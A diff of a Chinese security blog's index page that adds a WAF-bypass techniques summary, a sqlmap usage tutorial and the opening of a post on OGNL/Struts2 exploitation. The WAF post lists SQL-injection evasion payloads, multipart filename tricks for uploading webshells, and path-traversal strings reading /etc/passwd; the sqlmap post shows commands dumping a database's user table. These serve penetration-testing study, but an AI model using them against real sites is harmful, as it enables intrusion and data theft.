@@ -53,7 +53,7 @@
         
           <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Søk"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://wsygoogol.github.io"></form>
@@ -63,6 +63,223 @@
 </header>
       <div class="outer">
         <section id="main">
+  
+    <article id="post-WAF-Bypass-技巧总结" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/09/18/WAF-Bypass-技巧总结/" class="article-date">
+  <time datetime="2016-09-18T12:11:51.000Z" itemprop="datePublished">2016-09-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/09/18/WAF-Bypass-技巧总结/">WAF Bypass 技巧总结</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="waf分类"><a href="#waf分类" class="headerlink" title="waf分类"></a>waf分类</h4><p>掌握绕过各类WAF可以说是渗透测试人员的一项基本技能，本文将WAF分为云WAF、硬件WAF、软件WAF、代码级WAF，分别从各自的特性来谈一些相关的绕过技巧，更侧重于针对基于规则类的WAF绕过技巧。</p>
+<h6 id="1-云WAF"><a href="#1-云WAF" class="headerlink" title="1.云WAF"></a>1.云WAF</h6><p>Eg:加速乐<br>目前CDN服务的功能是越来越多，安全性也越加强悍，用户的每个请求都会被发送到指定的CDN节点上，最后转发给真实站点。这个过程就好像加了一道关卡，这个关卡提供了缓存、加速、防御的特点。<br>绕过关键：查询真实IP，若是直接访问服务器的IP就不经过CDN了。<br>以下四点有助于绕过。<br>1.查询历史DNS（在2016年加入到了cnd节点里面，可以通过查询2016年之前的dns记录）<br>2.查看子域名解析地址是否和主域名的IP地址相近。（有些网站只会将主站加入到CDN节点里面，这时可以查看其二级、三级域名的IP地址信息，进而猜到主站的IP地址）<br>3.CDN节点分发缺陷，通过国外IP访问网站可能会出现真实IP，因为有的CDN服务商可能只做了国内节点，没做国外的，这样访问请求是直接被转发到真实服务器地址上。<br>4.让服务器主动连接你。比如rss订阅服务或则是向邮箱服务器发送个错误的邮件比如地址不存在 通过抓包观察返回的头来,查找IP地址信息。</p>
+<h6 id="2-硬件waf"><a href="#2-硬件waf" class="headerlink" title="2.硬件waf"></a>2.硬件waf</h6><p>Eg:绿盟WAF</p>
+<h6 id="3-软件waf"><a href="#3-软件waf" class="headerlink" title="3.软件waf"></a>3.软件waf</h6><p>Eg:安全狗</p>
+<h4 id="基于规则的WAF工作原理"><a href="#基于规则的WAF工作原理" class="headerlink" title="基于规则的WAF工作原理"></a>基于规则的WAF工作原理</h4><p>数据获取(注意 get post等方法以及 post体方式)———数据清洗(去除多余数据比如编码,mssql支持unicode编码)———规则匹配———二次校验</p>
+<h5 id="绕注入"><a href="#绕注入" class="headerlink" title="绕注入"></a>绕注入</h5><h6 id="1-关键字替换"><a href="#1-关键字替换" class="headerlink" title="1.关键字替换"></a>1.关键字替换</h6><p>原理：<br>部分WAF是通过黑名单来起到拦截的作用，这种情况可以用关键字替换来实现绕过。比如在mysql中，waf将sleep()函数列入了黑名单，可以通过具备相同功能的benchmark()函数来实现绕过。以下是部分相同功能的替代函数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt; &gt; 等价于 BETWEEN</div><div class="line">= 等价于 like</div><div class="line">Hex() bin() 等价于ascii()</div><div class="line">Sleep() 等价于 benchmark()</div><div class="line">Mid()substring() 等价于 substr(）</div><div class="line">@@user 等价于 User()</div><div class="line">@@Version 等价于 version()</div><div class="line">(mysql支持&amp;&amp;  || ,oracle不支持 &amp;&amp; ||）</div></pre></td></tr></table></figure></p>
+<h6 id="2-特殊符号"><a href="#2-特殊符号" class="headerlink" title="2.特殊符号"></a>2.特殊符号</h6><p>原理：结合不同数据库的特性来实现绕过。(最好是可以找到waf开发者都不了解的某些特性),以下是两个广为流传的小特性：<br>比如 “+” select+password+from+mysql.user 相当于是一个空格的作用”`”放在mysql的末尾会起到注释符的作用</p>
+<h6 id="3-编码"><a href="#3-编码" class="headerlink" title="3.编码"></a>3.编码</h6><p>可以结合各种编码方式来绕过,比如url编码，url双重编码,十六进制编码，unicode编码，数据库编码等。<br>Eg：mysql默认的字符集是latin,因此在php代码里面设置的字符集为 utf-8,这只是客户端的字符集，因此存在字符集装换的问题utf-8—&gt;latin,若传进来的字符集不是完整的字符，则会导致不完整的字符自动会忽略的问题，比如username=admin%c2 ,   由于%c2不是一个完整的utf-8字符  因此传到Mysql  里面  自动忽略了，导致查出的是admin用户的数据，可以利用这个特性绕过。</p>
+<h6 id="4-注释符"><a href="#4-注释符" class="headerlink" title="4.注释符"></a>4.注释符</h6><p>/<em>xxx</em>/是注释，也可以充当空白符。因为 /<strong>/可使得MySQL对sql语句(union/</strong>/select)词法解析成功。事实上许多WAF都考虑到/<strong>/可以作为空白分，但是waf检测 “/*.<em>\</em>/“很消耗性能，工程师会折中，可能在检测中间引入一些特殊字符，例如：/<em>\w+</em>/。或者，WAF可能只中间检查n个字符”/*.{,n}*/“。根据以上想法，可以逐步测试绕过方法：<br>先测试最基本的：union/</strong>/select再测试中间引入特殊字：union/<em>aaaa%01bbs</em>/select最后测试注释长度：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">union/*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/select</div></pre></td></tr></table></figure></p>
+<h6 id="5-空白符绕过"><a href="#5-空白符绕过" class="headerlink" title="5.空白符绕过"></a>5.空白符绕过</h6><p>基于正则表达式的WAF， SQL注入规则使用正则表达式的”\s”匹配空格，例如”select\s+union”。<br>利用空白符进行绕过，测试WAF时尽可能减少其他原因的影响，例如”union select”被拦截，只需把中间空白符替换为”%250C”, “%25A0”进行绕过测试。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">union%250Cselect</div><div class="line">union%25A0select</div></pre></td></tr></table></figure></p>
+<p>函数分隔符对基于正则表达式的WAF，我们猜测安全工程师写WAF规则时，可能不知道函数名与左括号之间可以存在特殊字符，或者遗漏可以存在特殊字符。例如匹配函数”concat()”的规则写法，”concat(“或者”concat\s*(“，就没有考虑到一些特殊字符。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">concat%2520(</div><div class="line">concat/**/(</div><div class="line">concat%250c(</div><div class="line">concat%25a0(</div></pre></td></tr></table></figure></p>
+<h6 id="6-浮点数词法解析"><a href="#6-浮点数词法解析" class="headerlink" title="6.浮点数词法解析"></a>6.浮点数词法解析</h6><p>利用MySQL解析浮点数的特点，正则表达式无法匹配出单词union，但是MySQL词法解析成功解析出浮点数、sql关键字union。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select * from users <span class="built_in">where</span> id=8E0union select 1,2,3,4,5,6,7,8,9,0</div><div class="line">select * from users <span class="built_in">where</span> id=8.0union select 1,2,3,4,5,6,7,8,9,0</div></pre></td></tr></table></figure></p>
+<h6 id="7-报错注入"><a href="#7-报错注入" class="headerlink" title="7.报错注入"></a>7.报错注入</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">extractvalue(1, concat(0x5c,md5(3)));</div><div class="line">updatexml(1, concat(0x5d,md5(3)),1);</div><div class="line">GeometryCollection((select*from(select*from(select@@version)f)x))</div><div class="line">polygon((select*from(select name_const(version(),1))x))</div><div class="line">linestring()</div><div class="line">multipoint()</div><div class="line">multilinestring()</div><div class="line">multipolygon()</div></pre></td></tr></table></figure>
+<h5 id="绕上传"><a href="#绕上传" class="headerlink" title="绕上传"></a>绕上传</h5><p>关键是：waf与webserver的差异（waf的局限性与webserver的灵活性）。</p>
+<h6 id="1-协议解析不一致-文件名解析兼容性"><a href="#1-协议解析不一致-文件名解析兼容性" class="headerlink" title="1.协议解析不一致-文件名解析兼容性"></a>1.协议解析不一致-文件名解析兼容性</h6><p>multipart协议中，文件名的形式为”filename=”abc.php””。但是Tomcat、PHP等容器解析协议时会做一些兼容，能正确解析 “filename=”abc.php”、”filename=abc.php”、 “filename=’abc.php’”。而WAF只按照协议标准去解析，无法解析文件名，但是后端容器能正确获得文件名，从而导致被绕过。场景的绕过形式：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data; name=<span class="string">"file"</span>; filename=bc.php</div><div class="line">Content-Disposition: form-data; name=<span class="string">"file"</span>; filename=<span class="string">"abc.php</span></div><div class="line">Content-Disposition: form-data; name="file<span class="string">"; filename='abc.php'</span></div></pre></td></tr></table></figure></p>
+<h6 id="2-协议解析不正确-未解析所有文件"><a href="#2-协议解析不正确-未解析所有文件" class="headerlink" title="2.协议解析不正确-未解析所有文件"></a>2.协议解析不正确-未解析所有文件</h6><p>multipart协议中，一个POST请求可以同时上传多个文件。如图，许多WAF只检查第一个上传文件，没有检查上传的所有文件，而实际后端容器会解析所有上传的文件名，攻击者只需把paylaod放在后面的文件PART，即可绕过。</p>
+<h6 id="3-协议解析不正确-文件名覆盖"><a href="#3-协议解析不正确-文件名覆盖" class="headerlink" title="3.协议解析不正确-文件名覆盖"></a>3.协议解析不正确-文件名覆盖</h6><p>在multipart协议中，一个文件上传块存在多个Content-Disposition，将以最后一个Content-Disposition的filename值作为上传的文件名。许多WAF解析到第一个Content-Disposition就认为协议解析完毕，获得上传的文件名，从而导致被绕过。如图，加速乐的WAF解析得到文件名是”sp.pho”，但PHP解析结果是”sp.php”，导致被绕过。<br><img src="/upload_image/7.jpg" alt=""></p>
+<h6 id="4-变换位置"><a href="#4-变换位置" class="headerlink" title="4.变换位置"></a>4.变换位置</h6><p>因为WebServer获取参数的灵活性，所以我尝试把安全狗拦截的filename=”test.asp”换个位置。经过一番测试，发现filename=”test.asp”位于Content-Type: application/octet-stream<br>下一行时，安全狗的上传拦截便会失效。</p>
+<h6 id="5-文件名覆盖"><a href="#5-文件名覆盖" class="headerlink" title="5.文件名覆盖"></a>5.文件名覆盖</h6><p>在一个Content-Disposition 中，存在多个filename ，协议解析应该使用最后的filename值作为文件名。如果WAF解析到filename=”p3.txt”认为解析到文件名，结束解析，将导致被绕过。因为后端容器解析到的文件名是t3.jsp。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data;name=<span class="string">"myfile"</span>; filename=<span class="string">"p3.txt"</span>;filename=<span class="string">"t3.jsp"</span></div></pre></td></tr></table></figure></p>
+<h6 id="6-遗漏文件名"><a href="#6-遗漏文件名" class="headerlink" title="6.遗漏文件名"></a>6.遗漏文件名</h6><p>当WAF遇到”name=”myfile”;;”时，认为没有解析到filename。而后端容器继续解析到的文件名是t3.jsp，导致WAF被绕过。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Content-Disposition: form-data;name=<span class="string">"myfile"</span>;; filename=<span class="string">"t3.jsp"</span></div></pre></td></tr></table></figure></p>
+<h6 id="7-任意文件下载"><a href="#7-任意文件下载" class="headerlink" title="7.任意文件下载"></a>7.任意文件下载</h6><p>（1）相对路径：所以WAF文件包含规则通常会检测连续的”../“。根据vfs解析路径的语法，解析到”//“文件路径不变，解析到”/./“文件路径依然。 通过避免连续的”../“，从而绕过WAF文件包含规则。Eg: ././..///./.././/../etc//passwd，它等价于../../../etc/passwd。<br>（2）绝对路径：例如 /etc/./passwd 与 /etc/passwd 是等价的。还可以通过组合”/./“、”//“进行绕过，<br>Eg.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/etc///.//././/passwd</div><div class="line">/etc/passwd   /etc././././passwd</div></pre></td></tr></table></figure></p>
+<h4 id="代码级WAF"><a href="#代码级WAF" class="headerlink" title="代码级WAF"></a>代码级WAF</h4><p>所谓代码级的WAF是指程序员在程序内部，借助自身编写的过滤函数来保护应用程序的安全。以下是三种脚本语言通常会使用的过滤位置：</p>
+<h6 id="1-php"><a href="#1-php" class="headerlink" title="1. php"></a>1. php</h6><p>在php.ini中设置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">; Automatically add files before PHP document.; auto-prepend-fileauto_prepend_file =; Automatically add files after PHP document.; auto-append-fileauto_append_file =</div></pre></td></tr></table></figure></p>
+<p>配置指令，这些指令指向那些在每个请求的PHP脚本执行”之前”和”之后”才执行的PHP文件。这样就可以在各种HTTP请求集合(GET,POST,COOKIE)之前对数据进行一些前发处理。</p>
+<h6 id="2-asp-net"><a href="#2-asp-net" class="headerlink" title="2.asp.net"></a>2.asp.net</h6><p>通过ASP.NET的System.Web.IHttpModule接口来实现</p>
+<h6 id="3-java"><a href="#3-java" class="headerlink" title="3.java"></a>3.java</h6><p>通过filter来实现。比如tomcat会在web.xml的配置文件中配置过滤类。</p>
+<h4 id="绕过基于规则的WAF"><a href="#绕过基于规则的WAF" class="headerlink" title="绕过基于规则的WAF"></a>绕过基于规则的WAF</h4><p>目前市面的大部分WAF是通过规则来实现的，既然是规则，就一定存在不全面、不准确的情况。下面举几个例子帮助大家拓展一下思路：</p>
+<h6 id="1-封禁IP"><a href="#1-封禁IP" class="headerlink" title="1.封禁IP"></a>1.封禁IP</h6><p>比如有些waf会对重复的IP访问进行封锁,这时可以用在请求包体中加入  “X-Originating-IP:127.0.0.1”，因为waf不会拦截他自己。</p>
+<h6 id="2-前端waf"><a href="#2-前端waf" class="headerlink" title="2.前端waf"></a>2.前端waf</h6><p>针对于前端的waf,可以直接通过burp抓包绕过</p>
+<h6 id="3-改变user-agent"><a href="#3-改变user-agent" class="headerlink" title="3.改变user-agent"></a>3.改变user-agent</h6><p>我们在写网站防火墙规则的时候可能都会做一件事:永远不屏蔽那些主流搜索引擎机器人的爬取(如,Google,Bing,Yahoo,Baidu等).这时我们就可以在USER-Agent伪造自己是搜索引擎的爬虫，绕过waf.</p>
+<h6 id="4-缓冲区溢出"><a href="#4-缓冲区溢出" class="headerlink" title="4.缓冲区溢出"></a>4.缓冲区溢出</h6><p>比如waf只允许长度是2M的包体，而服务器则可以接受8M的包体，这种情况 可以通过发送2M-8M的包体将WAF溢出死。</p>
+<h6 id="5-替换关键字"><a href="#5-替换关键字" class="headerlink" title="5.替换关键字"></a>5.替换关键字</h6><p>需要考虑waf具体怎么拦截的，Seleselectct,倘若将中间的关键字删掉，则可以绕过。</p>
+<h6 id="6-webserver特性"><a href="#6-webserver特性" class="headerlink" title="6.webserver特性"></a>6.webserver特性</h6><p>iis 自动忽略%<br>我们知道asp有两个特性<br>1.会将Request中的不能编码部分的%去掉<br>2.Request中如果有unicode部分会将其进行解码<br>IIS6.0两个解析缺陷：目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析。<br>Apache1.X 2.X解析漏洞：<br>Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止。<br>Nginx解析漏洞：</p>
+<p>Nginx 0.5.<em>Nginx 0.6.</em>Nginx 0.7 &lt;= 0.7.65Nginx 0.8 &lt;= 0.8.37，以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求。<br>Nginx 0.8.41 – 1.5.6：以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg%20.php进行请求。<br>PHP CGI解析漏洞 : IIS 7.0/7.5 和 Nginx &lt; 0.8.3 以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析。<br>参数污染：比如waf只接受前一个参数这意味着，通过注入: id=7&amp;id=[SQLi]WAF的网络层会解析 id=7 ,合法PHP应用层会解析 id=[SQLi] 注入语句成功执行。</p>
+<h6 id="7-数据库特性"><a href="#7-数据库特性" class="headerlink" title="7.数据库特性"></a>7.数据库特性</h6><p>mysql：<br>1.隐形类型转换<br>2.为了便利性 牺牲安全性。（select <em> from admin where user=”Admin”   可以执行，  mysql为了 使用的便利性 会允许一些 ‘错误’，比如 select </em> from admin where user=” À dmin” 依然可移执行。<br>3.MySQL文件读取<br>(5.5以上的版本  由于secure_file_priv这个变量为null 因此无法使用文件读取  文件写入的功能。)</p>
+<h6 id="8-服务器特性"><a href="#8-服务器特性" class="headerlink" title="8.服务器特性"></a>8.服务器特性</h6><p>NTFS ADS特性：ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。<br>Windows在创建文件时，在文件名末尾不管加多少点都会自动去除，那么上传时filename可以这么写shell.php……也可以这么写shell.php::$DATA…….。<br>总结：本文主要对基于规则的WAF的绕过技巧，基于规则的waf有着天然的缺陷型，构造出基于规则之外的特性就有可能绕过。或者干脆将WAF直接打挂，这时waf很有可能直接启用Bypass模式。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/09/18/WAF-Bypass-技巧总结/" data-id="cjc1wxjng000ijo1bx229izb9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sqlmap-使用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/11/sqlmap-使用/" class="article-date">
+  <time datetime="2016-08-11T03:28:48.000Z" itemprop="datePublished">2016-08-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/11/sqlmap-使用/">sqlmap 使用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>sqlmap 是进行sql注入首选的工具，它可以帮助你快速的验证和利用一个sql注入漏洞。你可以在sqlmap的帮助下轻松的利用sql注入漏洞获取数据库数据甚至是getshell。<br>下载安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/sqlmapproject/sqlmap.git</div></pre></td></tr></table></figure></p>
+<p>当然，你也可以下载zip包直接解压，地址<a href="https://codeload.github.com/sqlmapproject/sqlmap/legacy.zip/master" target="_blank" rel="external">https://codeload.github.com/sqlmapproject/sqlmap/legacy.zip/master</a><br>然后解压出来目录其实就可以直接使用了。<br>大部分人只需要这么用<br>直接对一个url进行注入检测,-u参数指定检测的url<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php?user=jack&amp;id=1"</span></div></pre></td></tr></table></figure></p>
+<p>如果是post的参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span></div></pre></td></tr></table></figure></p>
+<p>ok，如果输入的参数过多，你可以使用-p来指定具体存在注入的参数，比如指定参数id注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id</div></pre></td></tr></table></figure></p>
+<p>下一步，获取数据库列表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --dbs</div></pre></td></tr></table></figure></p>
+<p>获取指定数据库的表名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql --tables</div></pre></td></tr></table></figure></p>
+<p>获取指定数据库及指定表的列名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql -T user --columns</div></pre></td></tr></table></figure></p>
+<p>dump数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql -T user --dump</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/" data-id="cjc1wxjnl000njo1bqc0putvj" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-OGNL机制和Struts2漏洞利用原理研究" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" class="article-date">
+  <time datetime="2016-08-08T07:56:31.000Z" itemprop="datePublished">2016-08-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/">OGNL机制和Struts2漏洞利用原理研究</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>在MVC开发框架中，数据会在MVC各个模块中进行流转。而这种流转，也就会面临一些困境，就是由于数据在不同MVC层次中表现出不同的形式和状态而造成的：</p>
+<h5 id="View层—表现为字符串展示"><a href="#View层—表现为字符串展示" class="headerlink" title="View层—表现为字符串展示"></a>View层—表现为字符串展示</h5><p>数据在页面上是一个扁平的、不带数据类型的字符串，无论数据结构有多复杂，数据类型有多丰富，到了展示的时候，全都一视同仁的成为字符串在页面上展现出来。数据在传递时，任何数据都都被当作字符串或字符串数组来进行。</p>
+<h5 id="Controller层—表现为java对象"><a href="#Controller层—表现为java对象" class="headerlink" title="Controller层—表现为java对象"></a>Controller层—表现为java对象</h5><p>在控制层，数据模型遵循java的语法和数据结构，所有的数据载体在Java世界中可以表现为丰富的数据结构和数据类型，你可以自行定义你喜欢的类，在类与类之间进行继承、嵌套。我们通常会把这种模型称之为复杂的对象树。数据在传递时，将以对象的形式进行。<br>可以看到，数据在不同的MVC层次上，扮演的角色和表现形式不同，这是由于HTTP协议与java的面向对象性之间的不匹配造成的。如果数据在页面和Java世界中互相传递，就会显得不匹配。所以也就引出了几个需要解决的问题：<br>1．当数据从View层传递到Controller层时，我们应该保证一个扁平而分散在各处的数据集合能以一定的规则设置到Java世界中的对象树中去。同时，能够灵活的进行由字符串类型到Java中各个类型的转化。<br>2．当数据从Controller层传递到View层时，我们应该保证在View层能够以某些简易的规则对对象树进行访问。同时，在一定程度上控制对象树中的数据的显示格式。<br>我们稍微深入思考这个问题就会发现，解决数据由于表现形式的不同而发生流转不匹配的问题对我们来说其实并不陌生。同样的问题会发生在Java世界与数据库世界中，面对这种对象与关系模型的不匹配，我们采用的解决方法是使用如hibernate，iBatis等框架来处理java对象与关系数据库的匹配。<br>现在在Web层同样也发生了不匹配，所以我们也需要使用一些工具来帮助我们解决问题。为了解决数据从View层传递到Controller层时的不匹配性，Struts2采纳了XWork的一套完美方案。并且在此的基础上，构建了一个完美的机制，从而比较完美的解决了数据流转中的不匹配性。就是表达式引擎OGNL。它的作用就是帮助我们完成这种规则化的表达式与java对象的互相转化(以上内容参考自Struts2 技术内幕)。</p>
+<h3 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h3><p>OGNL（Object Graph Navigation Language）即对象图形导航语言，是一个开源的表达式引擎。使用OGNL，你可以通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化。如果我们把表达式看做是一个带有语义的字符串，那么OGNL无疑成为了这个语义字符串与Java对象之间沟通的桥梁。我们可以轻松解决在数据流转过程中所遇到的各种问题。<br>OGNL进行对象存取操作的API在Ognl.java文件中，分别是getValue、setValue两个方法。getValue通过传入的OGNL表达式，在给定的上下文环境中，从root对象里取值：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">public static Object getValue(Object tree, Map context, Object root) throws OgnlException</div><div class="line">&#123;</div><div class="line">    <span class="built_in">return</span> getValue(tree, context, root, null);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>setValue通过传入的OGNL表达式，在给定的上下文环境中，往root对象里写值:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">public static void setValue(String expression, Map context, Object root, Object value)</div><div class="line">    throws OgnlException</div><div class="line">&#123;</div><div class="line">    setValue(parseExpression(expression), context, root, value);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>OGNL同时编写了许多其它的方法来实现相同的功能，详细可参考Ognl.java代码。OGNL的API很简单，无论何种复杂的功能，OGNL会将其最终映射到OGNL的三要素中通过调用底层引擎完成计算，OGNL的三要素即上述方法的三个参数expression、root、context。</p>
+<h4 id="OGNL三要素"><a href="#OGNL三要素" class="headerlink" title="OGNL三要素"></a>OGNL三要素</h4><h5 id="Expression-表达式-："><a href="#Expression-表达式-：" class="headerlink" title="Expression(表达式)："></a>Expression(表达式)：</h5><p>Expression规定OGNL要做什么，其本质是一个带有语法含义的字符串,这个字符串将规定操作的类型和操作的内容。OGNL支持的语法非常强大，从对象属性、方法的访问到简单计算，甚至支持复杂的lambda表达式。</p>
+<h5 id="Root-根对象-："><a href="#Root-根对象-：" class="headerlink" title="Root(根对象)："></a>Root(根对象)：</h5><p>OGNL的root对象可以理解为OGNL要操作的对象，表达式规定OGNL要干什么，root则指定对谁进行操作。OGNL的root对象实际上是一个java对象，是所有OGNL操作的实际载体。</p>
+<h5 id="Context-上下文"><a href="#Context-上下文" class="headerlink" title="Context(上下文):"></a>Context(上下文):</h5><p>有了表达式和根对象，已经可以使用OGNL的基本功能了。例如，根据表达式对root对象进行getvalue、setvalue操作。<br>不过事实上在OGNL内部，所有的操作都会在一个特定的数据环境中运行，这个数据环境就是OGNL的上下文。简单说就是上下文将规定OGNL的操作在哪里进行。<br>OGNL的上下文环境是一个MAP结构，定义为OgnlContext，root对象也会被添加到上下文环境中，作为一个特殊的变量进行处理。</p>
+<h4 id="OGNL基本操作"><a href="#OGNL基本操作" class="headerlink" title="OGNL基本操作"></a>OGNL基本操作</h4><h5 id="对root对象的访问："><a href="#对root对象的访问：" class="headerlink" title="对root对象的访问："></a>对root对象的访问：</h5><p>针对OGNL的root对象的对象树的访问是通过使用‘点号’将对象的引用串联起来实现的。通过这种方式，OGNL实际上将一个树形的对象结构转化为一个链式结构的字符串来表达语义，如下：<br>//获取root对象中的name属性值<br>name<br>//获取root对象department属性中的name属性值<br>department.name<br>//获取root对象department属性中的manager属性中的name属性值<br>department.manager.name</p>
+<h5 id="对上下文环境的访问"><a href="#对上下文环境的访问" class="headerlink" title="对上下文环境的访问"></a>对上下文环境的访问</h5><p>Context上下文是一个map结构，访问上下文参数时需要通过#符号加上链式表达式来进行，从而表示与访问root对象的区别，如下：<br>//获取上下文环境中名为introduction的对象的值<br>introduction<br>//获取上下文环境中名为parameters的对象中的user对象中名为name属性的值<br>#parameters.user.name</p>
+<h5 id="对静态变量、方法的访问"><a href="#对静态变量、方法的访问" class="headerlink" title="对静态变量、方法的访问"></a>对静态变量、方法的访问</h5><p>在OGNL中，对于静态变量、方法的访问通过@[class]@[field/method]访问，这里的类名要带着包名。如下<br>//访问com.example.core.Resource类中名为img的属性值<br>@com.example.core.Resource@img<br>//调用com.example.core.Resource类中名为get的方法<br>@com.example.core.Resource@get()</p>
+<h5 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h5><p>//调用root对象中的group属性中users的size()方法<br>group.users.size()<br>//调用root对象中group中的containsUser方法，并传递上下文环境中名为user值作为参数<br>group.containsUser(#user)</p>
